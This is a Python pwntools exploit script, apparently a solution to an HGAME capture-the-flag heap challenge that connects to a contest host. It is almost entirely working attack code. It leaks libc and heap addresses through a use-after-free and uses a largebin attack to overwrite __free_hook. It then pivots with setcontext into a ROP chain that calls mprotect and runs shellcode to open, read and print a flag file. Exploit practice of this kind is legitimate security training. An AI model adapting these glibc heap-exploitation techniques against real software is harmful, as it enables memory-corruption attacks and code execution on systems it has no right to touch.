from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["week-2.hgame.lwsec.cn",32367]
libc=ELF('./libc-2.32.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process('./vuln')
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def add(index, size):
    ru(b'>')
    sl(b'1')
    ru(b'Index: ')
    sl(str(index))
    ru(b'Size: ')
    sl(str(size))

def delete(index):
    ru(b'>')
    sl(b'2')
    ru(b'Index: ')
    sl(str(index))

def edit(index, content):
    ru(b'>')
    sl(b'3')
    ru(b'Index: ')
    sl(str(index))
    ru(b'Content: ')
    s(content)

def show(index):
    ru(b'>')
    sl(b'4')
    ru(b'Index: ')
    sl(str(index))

gdb.attach(p, '''
    b *$rebase(0x14d5)
    b *$rebase(0x16b8)
    b *$rebase(0x15ca)
''')

add(0, 0x528) # construct largebinattack
add(1, 0x600)
add(2, 0x518)
add(3, 0x600)

delete(0)
edit(0, b'\xa0')
show(0) #leak libc_base

leak_addr = u64(rc(6).ljust(8, b'\x00'))
libc_base = leak_addr - 0x1e3ca0
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
malloc_hook = leak_addr - 0x60 - 0x23
mp_ = libc_base + 0x1e3280
setcontext = libc_base + libc.sym['setcontext'] + 61
mprotect = libc_base + libc.sym['mprotect']

gadget = libc_base + 0x14b760
pop_rdi = libc_base + 0x2858f
pop_rsi = libc_base + 0x2ac3f
pop_rdx_rbx = libc_base + 0x1597d6


pr('libc_base', libc_base)
pr('free_hook', free_hook)
pr('malloc_hook', malloc_hook)
pr('mp_', mp_)

edit(0, b'\x00')

add(15, 0x900)

edit(0, b'a' * 0x10)
show(0)
ru(b'a' * 0x10)
heap_base = u64(rc(6).ljust(8, b'\x00')) - 0x290
pr('heap_base', heap_base)

payload = p64(malloc_hook + 0x10 + 0x490)
payload += p64(malloc_hook + 0x10 + 0x490)
payload += p64(mp_ + 0x30)
payload += p64(mp_ + 0x30)
edit(0, payload)

delete(2)
add(14, 0x900)
delete(1)
edit(0, b'a' * 0xe8 + p64(free_hook)) #e8 cuz largebin attacks and entry was corrupted.
add(1, 0x600)
edit(1, p64(gadget))

shellcode = asm('''
    push 0x67616c66 
    mov rdi,rsp
    xor esi,esi 
    mov eax,2
    syscall
    mov edi,eax
    mov rsi,rsp
    mov rdx,0x50
    xor eax,eax
    syscall
    xor edi,2 
    mov rsi,rsp
    mov rdx,0x50
    mov eax,edi
    syscall 
    ''')

payload = p64(0)
payload += p64(heap_base + 0x2a0)
payload += p64(0)
payload += p64(0)
payload += p64(setcontext)
payload = payload.ljust(0xa0, b'\x00')
payload += p64(heap_base + 0x2a0 + 0xb0)
payload += p64(pop_rdi)
payload += p64(heap_base)
payload += p64(pop_rsi)
payload += p64(0x1000)
payload += p64(pop_rdx_rbx)
payload += p64(7)
payload += p64(0)
payload += p64(mprotect)
payload += p64(heap_base + 0x3a0)
payload = payload.ljust(0x100, b'\x00')
payload += shellcode

edit(0, payload)
delete(0)

shell()
